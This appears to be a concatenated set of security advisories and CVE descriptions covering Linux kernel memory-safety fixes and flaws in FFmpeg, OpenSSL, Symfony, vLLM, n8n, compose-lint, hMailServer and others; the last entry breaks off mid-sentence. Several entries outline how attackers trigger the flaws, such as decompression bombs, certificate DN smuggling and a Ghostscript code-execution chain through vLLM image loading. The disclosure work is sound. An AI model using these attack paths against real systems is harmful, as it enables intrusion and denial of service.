In the Linux kernel, the following vulnerability has been resolved:

mm/khugepaged: flush deferred unmaps before dropping a failed folio

collapse_file() can fail its reference-count or dirty-folio check after
unmapping with TTU_BATCH_FLUSH.  Both paths put back the isolated folio,
then unlock it and drop the lookup reference before reaching the common
try_to_unmap_flush().

The page-cache reference does not keep the folio stable once the lock is
released.  Another collapse can replace and free it.  With its PTEs
already gone, that collapse cannot flush the first task's per-task TLB
batch, and retract_page_tables() skips short or unaligned VMAs.  A CPU can
therefore retain a user translation to the freed folio.  This has been
reproduced with unprivileged MADV_COLLAPSE on a memfd.

Flush at out_unlock while the lookup reference and folio lock are still
held.  The common flush continues to cover the accumulated pagelist on
both success and rollback, preserving batching on successful collapses.

In the Linux kernel, the following vulnerability has been resolved:

ntfs: don't allow compression on volumes with clusters larger than 4K

On a volume made with "mkntfs -c 8192", a user can set
FILE_ATTR_COMPRESSED on an empty file through system.ntfs_attrib.
Writing to the file and reading it back after dropping the page cache
then crashes:

  BUG: KASAN: slab-out-of-bounds in ntfs_read_compressed_block+0xa2c/0x2040
  Read of size 8192 at addr ffff88804355a000 by task dd/106

The read path only handles clusters up to 4K. It copies each cluster
out of a single page, and a compression block of 16 8K clusters does
not fit in the 64K ntfs_compression_buffer. Loading an inode already
rejects compressed data on such volumes.

Reject the flag change the same way.

In the Linux kernel, the following vulnerability has been resolved:

mm/huge_memory: fix list corruption when deferred_split_scan() races with deferred_split_folio()

Since the deferred split queue became a list_lru, the isolate callback
moves the folios it took a reference on to an on-stack list, linked
through folio->_deferred_list, and deferred_split_scan() takes them off
that list with list_del_init() without holding the list_lru lock.

deferred_split_folio() does not know about the on-stack list. It only
holds the list_lru lock when it looks at the same list_head, and it can
run for such a folio: a THP is queued when it is mapped, as a candidate
for the underused check, and is queued "again" when a part of it gets
unmapped:

  CPU0 deferred_split_scan()          CPU1 deferred_split_folio()
  list_del_init(&folio->_deferred_list)
    next->prev = prev
    prev->next = next
    entry->next = entry
                                      list_lru_lock_irqsave()
                                      folio_set_partially_mapped()
                                      __list_lru_add()
                                        list_empty(item)  -> true
                                        list_add_tail(item, &l->list)
                                          item->next = &l->list
                                          item->prev = tail
    entry->prev = entry

The folio now sits on the list_lru with ->prev pointing to itself. The
next removal leaves the neighbours pointing to it, and they still do so
after the folio has been freed. With CONFIG_DEBUG_LIST:

  list_del corruption. prev->next should be ffd4000000270090, but was
  ffd4000000278090. (prev=ffd4000000270090)

Fix it by grabbing the lock around list_del_init() so
deferred_split_folio() cannot race with it.

In the Linux kernel, the following vulnerability has been resolved:

mm/filemap: finish fault cleanup before dropping the fault lock

On a retried fault, a fatal signal interrupting the folio lock wait
makes lock_folio_maybe_drop_mmap() drop the fault lock without pinning
the file. However, filemap_fault() may still need to release
mapping->invalidate_lock. A concurrent munmap() can release the last
file reference and free the mapping before that unlock.

Defer dropping the fault lock to filemap_fault()'s retry cleanup, after
releasing invalidate_lock. If the fault lock was already dropped for
I/O, release the existing file reference instead. Keep the fault lock
held for FAULT_FLAG_RETRY_NOWAIT as before.

In the Linux kernel, the following vulnerability has been resolved:

mm/mglru: don't use stack pointers when walking PUD and PMD tables

MGLRU passes stack copies of page-table entries in walk_pud_range() and
walk_pmd_range() when walking to the next level. These copies can become
stale when khugepaged or MADV_DONTNEED (CONFIG_PT_RECLAIM) removes a PTE
table concurrently.

This pattern dates back to commit bd74fdaea146 ("mm: multi-gen LRU:
support page table walks"). Likely, earlier locking masked the latent
bug. Later changes exposed it: commit 1d65b771bc08 ("mm/khugepaged:
retract_page_tables() without mmap or vma lock") allowed concurrent
retraction, and commit cf4a65539c13 ("memcg-v1: no need for memcg locking
for MGLRU") dropped the walker's outer RCU protection.

The fix is simple, so just fix the original commit so we don't have to
speculate. To fix it, pass the actual PMD/PUD pointers. This restores the
RCU-protected lookup and validation against the live PMD. Note that the PUD
handling is required as well to handle folded page tables correctly in all
cases.

Fix generated by an LLM and sent by Josef Bacik in private.

[ david: handle walk_pud_range() as well, clarify+simplify description,
         adjust Fixes: ]

In the Linux kernel, the following vulnerability has been resolved:

drm/loongson: Fix double free on BO initialization failure

If ttm_bo_init_validate() fails, it drops the buffer object's reference
and cleans it up through the supplied destroy callback. lsdc_bo_destroy()
releases the GEM object and frees the enclosing lsdc_bo, so freeing it
again in lsdc_bo_create() causes a double free on a synchronous failure
path.

Let TTM own the cleanup after initialization has started and return the
error directly. Keep the explicit free on drm_gem_object_init() failure,
which occurs before ownership is passed to TTM.

Tested on LS7A2000 by making drm_vma_offset_add() return -ENOSPC for one
selected dumb-buffer creation. The error reached userspace, the destroy
callback ran once, and no handle was published or tracked BO retained.
Normal buffer creation, zeroing, mapping, readback and release passed.

AI assistance was used for the ownership analysis, fix, fault-injection
tools, build and test execution.

In the Linux kernel, the following vulnerability has been resolved:

batman-adv: stop originator purge worker before freeing TT

batadv_mesh_free() releases the translation tables via batadv_tt_free()
before batadv_originator_free() stops orig_work. The purge worker can
therefore still run while the TT is torn down. When an originator times
out, batadv_purge_orig_ref() calls batadv_tt_global_del_orig(), which
loads tt.global_hash and walks all buckets while taking their locks:

  CPU0                          CPU1
  batadv_tt_free()              batadv_purge_orig()
                                  batadv_tt_global_del_orig()
                                    hash = ...tt.global_hash;
    batadv_tt_global_table_free()
      batadv_hash_destroy(hash);
                                    spin_lock_bh(&hash->list_locks[i]);

Disable orig_work at the beginning of batadv_mesh_free(), directly after
the mesh was marked as deactivating. The second
disable_delayed_work_sync() in batadv_originator_free() is harmless because
it is free'd anyway.

In the Linux kernel, the following vulnerability has been resolved:

drm/drm_crtc: ensure dma_fence_ops remain valid during device unbind

In [1], sashiko reported the following issue:

=== snip ===
Looking at how these fences are managed, drm_crtc_create_fence()
creates a dma_fence without taking a reference to the drm_device or
drm_crtc. Because the sync_file framework exposes this fence to
userspace, the fence can outlive the CRTC.

The dma_fence contract requires that data accessed by dma_fence_ops
(like get_driver_name) must remain valid for an RCU grace period after
the fence is signaled. However, drm_crtc_cleanup() and the subsequent
freeing of the device do not wait for an RCU grace period via
synchronize_rcu().

If userspace calls ioctl(SYNC_IOC_FILE_INFO) concurrently with a device
hot-unplug:

CPU1 (Userspace)
sync_file_get_name()
  ops = rcu_dereference(fence->ops);
  if (!dma_fence_test_signaled_flag())
    // Preempted or delayed here

CPU2 (Driver Teardown)
Signals the fence (setting fence->ops = NULL)
Destroys and frees the CRTC without waiting for an RCU grace period

CPU1 (Resumes)
  ops->get_driver_name(fence) -> drm_crtc_fence_get_driver_name()
  crtc = fence_to_crtc(fence); // Casts to the freed CRTC
  return crtc->dev->driver->name; // Use-after-free

...

Does the CRTC or DRM device need to be kept alive for the RCU grace
period, or should the fence hold a proper reference to prevent the
use-after-free when get_driver_name() and get_timeline_name() access
the freed CRTC structure?
=== snap ===

I believe this to be a correct observation and this patch implements
the suggestion of waiting for an RCU grace period before proceeding
with destruction of the drm_crtc, so that get_driver_name() and
get_timeline_name() can still work.

In the Linux kernel, the following vulnerability has been resolved:

9p/trans_virtio: reject mount tags longer than NAME_MAX at probe

p9_virtio_probe() reads a 16-bit mount tag length (tag_len) from the
device config and kzalloc()s tag_len + 1 bytes for chan->tag with no
upper bound. A malicious or compromised host can present a tag of up to
65535 bytes; that tag is later copied into the single-page sysfs buffer
by p9_mount_tag_show() (memcpy(buf, chan->tag, tag_len + 1)), a
host-controlled out-of-bounds write of up to ~64 KiB past the PAGE_SIZE
attribute buffer.

Reject an overlong tag at probe time. A 9p mount tag is a name-like
identifier, so bound it by NAME_MAX (255): that limit is independent of
the sysfs/seq_file page size and is far above any legitimate mount tag,
which keeps p9_mount_tag_show() safe at the root without hard-coding a
seq_file implementation detail.

FFmpeg before 9.1 contains a heap buffer overflow vulnerability in recv_msg() of the zmq and azmq filters that allows unauthenticated network attackers to corrupt memory by sending oversized command messages. Attackers can send a 4 GiB message to the default listening port, truncating the int buffer size so memcpy() writes past the heap allocation and crashes FFmpeg.

Improper Handling of Highly Compressed Data (Data Amplification) in esaml_binding in dropbox esaml allows an unauthenticated attacker to exhaust server memory and crash the Erlang VM via a crafted compressed SAMLResponse.

esaml_binding:decode_response/2 base64-decodes the attacker-supplied SAMLResponse, inflates it with zlib:unzip/1 with no bound on the output, then converts the result to a charlist with binary_to_list/1 before parsing. This runs on the SAML consume (ACS) and single-logout endpoints, which accept unauthenticated requests by design, and it runs before any signature check. A small deflate stream reaches a compression ratio near 1000 to 1, so a request body of tens of kilobytes inflates to hundreds of megabytes and then to several gigabytes of list heap, so a few requests exhaust memory and take the node down.

This issue affects esaml: from 0.1.0 onward.

n8n before 2.42.6, 2.43.x before 2.43.3, and 3.x before 3.0.1 contains a remote code execution vulnerability via deprecated Function, Function Item, and LangChain Code nodes running outside task runner isolation. Authenticated users who can create, modify, or import workflows naming these hidden node types can execute JavaScript in the n8n main process.

actix-http before 3.20.1 and actix-web before 4.18.2 contain an unbounded decompression vulnerability in encoding::Decoder that lets remote attackers exhaust memory and CPU via compressed bodies. Attackers can send small highly compressed gzip, deflate, Brotli or zstd request bodies to Json, Form, Bytes or String extractors, or serve them to awc clients, causing denial of service.

AIOHTTP is an asynchronous HTTP client/server framework for asyncio and Python. Prior to 3.14.4, aiohttp decompresses each member of a payload containing many concatenated gzip, deflate, or zstd streams by passing the entire remaining input to a new decompressor, causing quadratic CPU use. Empty members produce no output, so client_max_size and output backpressure do not limit the work. A remote attacker can block a server event loop with a crafted compressed request body or WebSocket message, and a malicious server can similarly block a client. This issue is fixed in version 3.14.4.

MISP accepted compressed HTTP request bodies (gzip, brotli, zstd) and decompressed them before authentication was performed, with no limit on the size of the resulting decompressed data. An unauthenticated attacker could send a small compressed payload that expands to a very large decompressed body, exhausting server memory and causing a denial of service. Brotli and zstd, with their high compression ratios, made the attack particularly effective.

The vulnerability required no authentication and no special conditions beyond the ability to send an HTTP request with a Content-Encoding header. The impact is a complete loss of availability for the affected MISP instance.

Affected: MISP versions prior to 2.5.52.
Memory overflow / improper handling in BGP dynamic routing can lead to unpredictable or erroneous behavior or Denial of Service in Citrix NetScaler ADC and Citrix NetScaler Gateway.

items.title: compress zstd: Panic on two-block frames
items.description: compress provides various compression algorithms. Prior to 1.20.2, the zstd DecodeAll and streaming decoder paths can panic when a crafted two-block frame reaches huff0.ReadTable with an FSE normalized count of 32768 that readNCount stores in int16 as -32768. The wrapped count allows buildDtable to retain stale fse.Scratch decode-table state from the prior block, and nextFast then derives an out-of-range state and indexes beyond the table instead of returning a decode error. Both blocks are required to preserve and then reuse the stale state, allowing untrusted zstd input to crash an application. This issue is fixed in version 1.20.2.

FreeRDP before 3.32.2 contains a denial of service vulnerability in WinPR's winpr_read_png_from_buffer() and winpr_convert_from_jpeg(), which lack libpng/libjpeg error handling. A malicious RDP server or MITM can offer a malformed PNG or truncated JPEG clipboard payload, causing the client to abort or exit.

Authentication bypass by spoofing in X509Authenticator and X509AuthenticationListener of Symfony versions prior to 5.4.56, 6.x prior to 6.4.50, 7.x prior to 7.4.23, and 8.x prior to 8.1.11 allows an attacker holding a certificate from the application's trusted CA who can influence the CN to authenticate as an arbitrary user of the application, including a privileged one, following an incomplete fix for CVE-2026-45063.
X509Authenticator extracts the user identifier from the Subject DN (Distinguished Name) that the web server passes in $_SERVER['SSL_CLIENT_S_DN']. The fix for CVE-2026-45063 anchored that extraction to an RDN (Relative Distinguished Name) boundary, but the regular expression used was not escape-aware. The expression runs against an already serialized DN, so it cannot tell an RDN separator from a separator character that occurs inside a value. Under RFC 2253, used by Apache and by nginx's $ssl_client_s_dn, a comma inside a value is escaped as \, and the expression reads it as a separator regardless. RFC 2253 also does not treat / as a separator, so it leaves it bare inside a value, while the expression treats every / as one. The legacy X509_NAME_oneline() format, used by Apache's LegacyDNStringFormat and by nginx's $ssl_client_s_dn_legacy, is the mirror image: it escapes / as \/ and leaves , bare. In that format, a certificate with no emailAddress attribute, or whose poisoned CN precedes it, authenticates as the smuggled address.





To cover both RFC 2253 and the legacy X509_NAME_oneline() format, X509Authenticator and X509AuthenticationListener now split the DN into RDNs before looking for the attribute, instead of matching the attribute against the serialized string. They select the separator from the serialization, split on unescaped occurrences of that separator only, unescape each RDN afterwards with the rules of its format, and require the attribute to span a whole RDN. The accepted value grammar is unchanged.




Applications that pass a per-attribute user key (such as SSL_CLIENT_S_DN_Email) and deployments whose CA generates or validates the subject are not affected by this vulnerability.

Issue summary: When an application passes a stack to
PEM_X509_INFO_read_bio_ex() to add entries to, and reading fails,
OpenSSL frees every entry in the stack, both the old ones and any new
ones, but leaves them in the stack.

Impact summary: An application that passes an existing stack to
PEM_X509_INFO_read_bio_ex() and keeps using it after a failed read may
use memory that was already freed. This can cause a crash or, in
principle, memory corruption. Malformed PEM data can make the read fail,
but only applications that pass an existing stack are affected, and
OpenSSL itself does not do this.

CWE: CWE-416: Use After Free

Description: PEM_X509_INFO_read_bio_ex() reads certificates, CRLs and
private keys from PEM data and adds them to a stack of X509_INFO
structures. If the application passes a stack that is not NULL, the
function adds the new entries to it and must leave the entries that are
already there unchanged.

If reading fails, the function frees every entry in the stack. This
includes the entries that were there before the call, and the entries
added by the call. It does not remove these entries from the stack, so
the stack keeps pointers to freed memory. The failure can happen at any
point, even before any entry was added. A PEM item with invalid content
is enough.  This also happens if the stack was empty: entries added
before the failure are freed but stay in the stack.

An application that then reads or frees the stack will use memory that
was already freed. This can crash the application or, in principle,
corrupt memory.

Only applications that pass a stack that is not NULL are affected.
OpenSSL itself never does this. Its own callers, including the code that
TLS uses to load CA certificates, always pass NULL. When the stack is
NULL, the function frees only the entries that it created itself, which
is safe. We expect that very few applications pass an existing stack. An
attacker can make the read fail with malformed PEM data, but cannot make
an application pass an existing stack.

The same problem affects PEM_X509_INFO_read_bio(), PEM_X509_INFO_read()
and PEM_X509_INFO_read_ex(), which use the same code. OpenSSL 1.1.1 and
1.0.2 have only the first two of these functions.

FIPS impact: no
The affected code is outside the FIPS module boundary.

items.title: bep/imagemeta: Unbounded memory allocation decoding PNG `zTXt` "Raw profile type iptc" chunks
items.description: bep/imagemeta is a Go library for reading EXIF, IPTC and XMP image meta data from JPEG, TIFF, PNG, and WebP files. Prior to 0.17.3, imagemeta.Decode could exhaust memory when parsing PNG zTXt chunks whose keyword is "Raw profile type iptc": the declared chunk length can drive an allocation far larger than the input file, and the embedded zlib stream is decompressed without an output limit. The advisory reports a 42-byte input causing a 256 MB allocation and a 127 KB input inflating to 460 MB. The oversized-allocation path's memory effect depends on platform overcommit and configured GOMEMLIMIT or cgroup limits, while the decompression path reliably creates resident memory. Applications that decode untrusted PNGs with IPTC metadata processing can therefore suffer denial of service through memory exhaustion. This issue is fixed in 0.17.3.

items.title: ArcadeDB before 26.11.1 Unauthenticated Redis Connection Hold Denial of Service
items.description: ArcadeDB before 26.11.1 contains a denial of service vulnerability in the Redis protocol handler, which neither replies to nor closes a pre-authentication connection when it receives an array whose first element is not a string. Unauthenticated attackers can resend such an array just within the 30-second socket idle timeout to hold connections open indefinitely and exhaust RedisNetworkExecutor threads.

items.title: actix-http 3.0.0 before 3.20.3 Denial of Service via Large-Window Brotli Decompression
items.description: actix-http 3.0.0 before 3.20.3 contains a denial of service vulnerability that allows unauthenticated remote attackers to exhaust memory by sending large-window brotli request bodies. Attackers can send an 850-byte body with Content-Encoding: br declaring a 2^30 window, forcing about 1 GiB of decoder allocation per request and OOM-killing servers.

items.title: vLLM: Untrusted EPS inputs can trigger denial of service or Ghostscript RCE
items.description:
### Summary

In vLLM 0.30.0, `ImageMediaIO` passes attacker-controlled image bytes to Pillow's format autodetection without restricting the accepted formats; the request's MIME label does not constrain decoder selection. An EPS payload labeled `image/png` reached the host's Ghostscript executable. On a host with Ghostscript affected by CVE-2024-29510, this exposes the known Ghostscript sandbox escape through vLLM's image-loading path and can execute commands with the vLLM process's privileges. A bounded marker-command payload executed through the PyPI wheel's actual `ImageMediaIO.load_base64()` implementation using Debian Ghostscript 10.03.0. The loader-level execution is reproduced; the HTTP request path is source-traced but was not exercised end to end. This report concerns vLLM's untrusted-format dispatch and does not claim a new Ghostscript vulnerability. Exploitation requires an image-capable request path, a caller able to reach it under the deployment's authentication policy, and a vulnerable host Ghostscript build.

### Details

`ImageMediaIO` is the boundary where attacker-controlled bytes enter Pillow's format autodetection: the declared MIME type does not constrain decoder selection, and the loader calls `Image.open(BytesIO(data))` without a Pillow format allowlist. Pillow recognizes EPS by its file signature, and vLLM's subsequent `image.load()` call enters Pillow's EPS processing path. The OpenAI chat multimodal parser reaches this path through [`parse_image()` and `fetch_image()`](https://github.com/vllm-project/vllm/blob/bc21cba9673cfc2256a2726b4bc32f062237cd35/vllm/entrypoints/chat_utils.py#L1077-L1081) and the [media connector](https://github.com/vllm-project/vllm/blob/bc21cba9673cfc2256a2726b4bc32f062237cd35/vllm/multimodal/media/connector.py#L367-L402); the data URL path extracts the MIME label and forwards the bytes to the loader ([source](https://github.com/vllm-project/vllm/blob/bc21cba9673cfc2256a2726b4bc32f062237cd35/vllm/multimodal/media/connector.py#L319-L332)). This is the vLLM-specific issue: untrusted image bytes can select a Pillow-supported format parser. Each downstream impact depends on the relevant parser, component version, and host configuration.

Pillow recognizes EPS by its file signature and invokes Ghostscript with `-dSAFER`, `-sDEVICE=pnmraw`, and the untrusted EPS input ([Pillow EPS plugin](https://github.com/python-pillow/Pillow/blob/12.3.0/src/PIL/EpsImagePlugin.py#L132-L159), [load path](https://github.com/python-pillow/Pillow/blob/12.3.0/src/PIL/EpsImagePlugin.py#L405-L415)). The command execution in this report uses the already-known Ghostscript CVE-2024-29510, which allows crafted PostScript to bypass `-dSAFER`; Ghostscript lists 10.03.1 as the upstream fixed version ([Ghostscript CVE details](https://www.ghostscript.com/releases/cve/index.html)). This is an N-day dependency chain: CVE-2024-29510 provides the command-execution primitive, while the vLLM-specific issue is that untrusted, remotely supplied image bytes can reach the affected interpreter. No new Ghostscript flaw is claimed here.

The vLLM Python requirements declare Pillow but not Ghostscript, so this execution chain depends on a Ghostscript executable supplied by the host or deployment image. I reproduced command execution with the PyPI `vllm==0.30.0` wheel, Pillow 12.3.0, and Debian amd64 Ghostscript `10.03.0~dfsg-1`. The Codean Labs CVE-2024-29510 testkit identified that Ghostscript build as vulnerable. The adapted EPS payload ran only `touch` on a temporary marker. The marker existed after the loader call, although Pillow then raised `ValueError` because the exploit changes Ghostscript's output device. The API route was traced in source but a model-backed HTTP request was not run. Only PyPI `vllm==0.30.0` was checked; no wider affected release range or other Ghostscript vendor build is claimed.

The same input boundary also exposes a separate Pillow-only denial-of-service condition when the installed Pillow version is 12.0.0–12.2.0. CVE-2026-59203 is triggered by a negative `%%BeginBinary` byte count and causes Pillow's EPS parser to loop during `Image.open()`; it does not invoke Ghostscript or provide code execution ([Pillow advisory](https://github.com/python-pillow/Pillow/security/advisories/GHSA-pg7v-jwj7-p798)). The published [`vllm==0.30.0` requirements](https://github.com/vllm-project/vllm/blob/v0.30.0/requirements/common.txt#L21) leave Pillow unpinned, so an existing environment can retain an affected Pillow version; the source at commit `bc21cba9673cfc2256a2726b4bc32f062237cd35` requires [`pillow>=12.3.0`](https://github.com/vllm-project/vllm/blob/bc21cba9673cfc2256a2726b4bc32f062237cd35/requirements/common.txt#L22). In an isolated local check with Pillow 12.2.0, the official sample hung through `ImageMediaIO.load_bytes()` and `MediaConnector.fetch_image_async()`. Eight concurrent image loads occupied the connector's eight media-loading threads and left a benign image load queued. Pillow 12.3.0 rejected the sample promptly. This confirms a conditional media-processing DoS path, separate from the Ghostscript RCE chain; full HTTP-server availability was not measured.

### Impact

When a vLLM image-processing endpoint accepts attacker-supplied content and the host has Ghostscript affected by CVE-2024-29510, a caller who can reach the endpoint can trigger command execution as the vLLM process user. API-key authentication and network access controls determine who can reach the request path. Deployments without Ghostscript or with a build fixed for CVE-2024-29510 are not affected by this execution chain. Separately, existing environments that run vLLM 0.30.0 with Pillow 12.0.0–12.2.0 are exposed to CVE-2026-59203 through the same image-format dispatch boundary; the demonstrated impact is exhaustion of media-loading workers, and this Pillow CVE does not cause RCE. The report asks vLLM to assess and address the unsafe dispatch of untrusted image bytes and the affected dependency combinations.

This advisory was fixed in [MR60022](https://github.com/vllm-project/vllm/pull/60022).

items.title: OSAC operator: Kubeconfig credential-plugin execution and SSRF in console proxy
items.description:
### Impact

 The console-proxy's RemoteConfigResolver parses kubeconfig data from Kubernetes Secrets using clientcmd.RESTConfigFromKubeConfig without sanitizing the resulting rest.Config. A kubeconfig containing an exec
  plugin stanza (under users[].user.exec) is faithfully preserved. When rest.TransportFor later builds the HTTP transport for the upstream WebSocket connection, client-go invokes the exec plugin — spawning an
  arbitrary process as the osac-console-proxy service account.

  This allows remote code execution inside the console-proxy pod for any principal that can create or modify a Secret with the label osac.openshift.io/remote-cluster-kubeconfig: "true" in a namespace where the
  console-proxy has Secret read access (governed by its RoleBinding). A secondary vector exists via attacker-controlled clusters[].server, enabling server-side request forgery (SSRF) from within the proxy pod.

  Affected configurations: any deployment using remote or auto VM cluster mode (the default). Deployments using local mode exclusively are not affected, as they do not read kubeconfig Secrets.

### Patches


  The fix is two lines in internal/consoleproxy/config_resolver.go, applied immediately after clientcmd.RESTConfigFromKubeConfig returns:

  config.ExecProvider = nil
  config.AuthProvider = nil

  This is patched in `0.0.4`. Users should upgrade to the first release containing this patch once available.

### Workarounds

  - Restrict Secret creation in the namespace where the osac-console-proxy-secret-reader RoleBinding is deployed. Ensure only trusted principals (cluster admins, operator service accounts) can create or modify
  Secrets there.
  - Switch to local VM cluster mode (--vm-cluster-mode=local) if the KubeVirt VMs run on the same cluster as the proxy. This bypasses the Secret-based kubeconfig lookup entirely.
  - Use an admission webhook or OPA policy to reject Secrets containing exec: or auth-provider: stanzas in the kubeconfig data within the affected namespace.

In Progress® Telerik® UI for ASP.NET Core versions `2015.1.318` through `2026.3.811`, repeated server-side aggregation requests, with or without grouping, cause dynamic assemblies and load contexts to be retained, resulting in accumulating process memory consumption. An unauthenticated remote attacker can exploit this if the application exposes an aggregation endpoint that is reachable without authentication. Repeated requests can cause memory growth that may exhaust available resources and affect application availability. Disabling grouping in the client-side interface does not prevent direct requests containing these descriptors. The issue is fixed in version `2026.3.1015`.

In Progress® Telerik® UI for ASP.NET Core versions `2015.1.318` through `2026.3.1015`, the server-side FilterParser processes nested expressions in untrusted filter parameters through recursive parsing without a recursion-depth limit, while FilterLexer does not enforce an input-length limit. An unauthenticated remote attacker can exploit this if the application exposes an endpoint using DataSourceRequest model binding that is reachable without authentication. Deeply nested filters can trigger parsing errors during model binding or cause `StackOverflowException`. This issue is fixed in version `2026.4.1111`.

PandaWiki 3.65.0 through 3.87.5 contains a stored cross-site scripting vulnerability that allows unauthenticated attackers to upload HTML files with image extensions via /share/v1/common/file/upload. Attackers can lure administrators to /static-file/<key>?a=.pdf, bypassing the nginx attachment header to serve HTML inline and steal the panda_wiki_token JWT for session takeover.

items.title: compose-lint: `fix --apply` can delete a line the user did not select, including a security setting
items.description:
### Impact

`compose-lint fix --apply` converts the line numbers its fixers work with into positions in the file. The YAML parser treats a lone carriage return, U+0085, U+2028 and U+2029 as line breaks, but the conversion counted only `\n`. One of those characters inside a quoted value, which most editors and diff views don't show, shifted every later edit down by one line.

A Compose file from a pull request can use this to make a fix delete the line after the one it meant to change. For example, fixing CL-0014 (`logging: driver: none`) instead removes `driver: none` and the following `networks: [internal]`, moving the service off an internal-only network onto the default bridge. The result is still valid Compose, every check `fix` runs after editing passes, and the command reports `applied 1 fix(es)` and exits 0. A later `compose-lint check` passes too, because no rule requires `networks:`. The dry-run diff (without `--apply`) does show the removed lines, but `--apply` prints only the note for the fix that was selected.

A related crash on the same files could empty the SARIF output for every file in the run. GitHub Code Scanning rejects an empty SARIF upload, which fails the step, so that part does not report a false clean result there.

Found during an internal pre-1.0 security review.

**Docker image.** `composelint/compose-lint` tags 0.9.0 through 0.17.0, and the matching minor tags, are affected when used to run `fix --apply`. Fixed from `0.18.0`.

The GitHub Action does not run `fix` and is not affected.

### Patches

Fixed in 0.18.0. Line splitting and position conversion now share one definition of a line break, so they can't disagree. A Compose file containing an ambiguous line break (a lone `\r`, U+0085, U+2028 or U+2029) is refused with exit code 2, because no line numbering is correct for both the parser and the editor. CRLF and LF files are unaffected.

### Workarounds

- Upgrade to 0.18.0 or later.
- On older versions, review the dry-run diff before `--apply`, and don't run `fix --apply` over files from untrusted pull requests.

### Reproduction

```yaml
services:
  web:
    image: nginx@sha256:<digest>
    labels:
      note: "line one<U+2028>line two"
    logging:
      driver: none
    networks: [internal]
networks:
  internal:
    internal: true
```

`compose-lint fix --apply compose.yml` on 0.17.0 reports `applied 1 fix(es)`, exits 0, and removes both `driver: none` and `networks: [internal]`.

items.title: Hypershift-addon: hypershift-addon: overly permissive clusterrolebinding allows any authenticated user to modify and delete managed clusters
items.description: A flaw was found in hypershift-addon. Due to an overly permissive role-based access control (RBAC) configuration that grants permissions to all authenticated users rather than restricting them to the addon service, a low-privileged authenticated user can view, modify, or delete managed cluster resources. This improper authorization allows unauthorized users to alter or disrupt clusters across the entire managed fleet.
vendor_products: Red Hat Multicluster Engine for Kubernetes
Red Hat Multicluster Engine for Kubernetes 5

items.description:
In the Linux kernel, the following vulnerability has been resolved:

batman-adv: tt: ignore ROAM flag of received ADD changes

A received TT change (OGM diff or full table response) with the ROAM flag
but without DEL is handled by batadv_tt_global_add() like a ROAMING_ADV:

* a newly created global entry gets BATADV_TT_CLIENT_ROAM and is
  therefore excluded from the global CRC. The sender has it in its local
  CRC and the receiver has to request the full table again
* batadv_tt_global_purge_local() removes the local entry of the
  receiver. The receiver's own client is considered as roamed to the sender
  and frames for it are rerouted

The ROAM flag only has a meaning together with DEL. Drop it on reception to
keep it from populating the global table with a temporary ROAMING entry
which is not part of the CRC - and therefore causing a CRC mismatch.

In the Linux kernel, the following vulnerability has been resolved:

ksmbd: fix use-after-free after a failed durable reconnect

ksmbd_reopen_durable_fd() republishes a detached durable handle in the
reconnecting session's file table and takes no reference for that entry.
If smb2_open() then fails, cleanup relies on the final ksmbd_fd_put() to
remove the volatile id.

Two reconnects of the same handle can both take a lookup reference before
either attaches it. If the one that reopens first then fails and drops
its references first, the other request makes the final put through
ksmbd_put_durable_fd(). That frees the handle without removing the first
session's table entry, so tearing that session down writes to freed
memory.

  BUG: KASAN: slab-use-after-free in __close_file_table_ids+0x14d/0x740 [ksmbd]
  Call Trace:
   __close_file_table_ids+0x14d/0x740 [ksmbd]
   ksmbd_destroy_file_table+0x76/0x100 [ksmbd]
   ksmbd_session_destroy+0xf8/0x480 [ksmbd]
   ksmbd_dispose_sessions+0x13e/0x200 [ksmbd]
   ksmbd_conn_sessions_cleanup+0x4c3/0x6d0 [ksmbd]
  Freed by task 1030:
   __ksmbd_close_fd+0x97d/0x1000 [ksmbd]
   smb2_open+0x14eb/0xd9f0 [ksmbd]

Commit 3515503322f4 ("ksmbd: fix durable reconnect error path file
lifetime") handles a final put made by the reconnecting request, but not
one made by another holder.

Remove the volatile id under the file-table lock on this error path,
before the references are dropped, as ksmbd_close_fd() does on the
request_open path just above. Removal then no longer depends on which
holder makes the final put. The stale comment in the reconnect cleanup
is updated to match. A successful reconnect is unchanged.

In the Linux kernel, the following vulnerability has been resolved:

dpaa2-switch: fix the error path in dpaa2_switch_rx()

In case of an error in dpaa2_switch_rx(), the dpaa2_switch_free_fd()
function is called in order to free the FD. This is incorrect since the
dpaa2_switch_free_fd() is intended to be used on Tx frame descriptors,
meaning that it expects in the software annotation area of the FD data
to find a valid skb pointer on which to call dev_kfree_skb().

Fix this by extracting the dma_unmap_page() from
dpaa2_switch_build_linear_skb() directly into the dpaa2_switch_rx()
function. This allows us to directly use free_pages() in case of an
error before an SKB was created and kfree_skb() afterwards.

In the Linux kernel, the following vulnerability has been resolved:

Bluetooth: btintel_pcie: fix TX descriptor bounds check

btintel_pcie_prepare_tx() uses tfd_index to access the TFD and data
buffer arrays before the index is advanced modulo txq->count. An index
equal to txq->count is one past the end of both arrays, so reject it in
the bounds check.

Codex Desktop for Windows does not correctly check quotation marks in project paths from Windows Explorer. If a user selects "Open project in ChatGPT" for an attacker-controlled library's child item, the path can add application startup arguments. These arguments can run attacker-controlled code with the current Windows user's permissions before sign-in or project trust approval.
vendor_products: OpenAI Codex Desktop for Windows (Microsoft Store/MSIX package)

items.description:
In the Linux kernel, the following vulnerability has been resolved:

ksmbd: hold a connection reference for each session channel

ksmbd_session_unregister() removes a session from the global and per-
connection tables before dropping the table reference. A concurrent
reference holder can keep the session and its channel list alive after
those removals.

Connection cleanup can no longer find the unpublished session to remove its
channels. Since a channel only stores a raw conn pointer, the connection
can be freed while another session reference holder is still accessing it,
for example during SMB3.1.1 binding or a procfs read.

Take a connection reference when registering a channel and release it on
insertion failure, channel removal, or final session destruction. Keep the
channels and signing keys until the session is destroyed so a response can
still be signed after the session has been unregistered.

Progressive Robot hMailServer 6.0.0-B1 through 6.3.7 on Windows hands OpenSSL the names of its own TLS files - the listeners' certificates, chains, private keys and Diffie-Hellman parameters, a port's client-certificate CA file (from 6.2.19), the object store's CA file (from 6.3.4) and the ACME client's keys and certificates - as Latin-1 bytes, which on code page 1252 are the code page's own for U+00A0 to U+00FF, and OpenSSL's file opening on Windows reads a name as UTF-8 first and opens the file at that reading when it is there, or creates it there when its folder is. When every byte of a configured name outside ASCII also reads as UTF-8 - for example U+00C3 U+00A9, the bytes C3 A9, which are U+00E9 in UTF-8 - the server used the file at that other name whenever one was there, which allows a local attacker who can create that file or its folder but cannot change the configured one, as any user can by default beside a file an administrator keeps under ProgramData, to have a port that logs on by client certificate (from 6.2.25) accept certificates from a certificate authority of the attacker's own and so sign in over the network as any mailbox without its password; to have the server trust such an authority for its object store and, intercepting that connection, read and modify the messages it stores; to 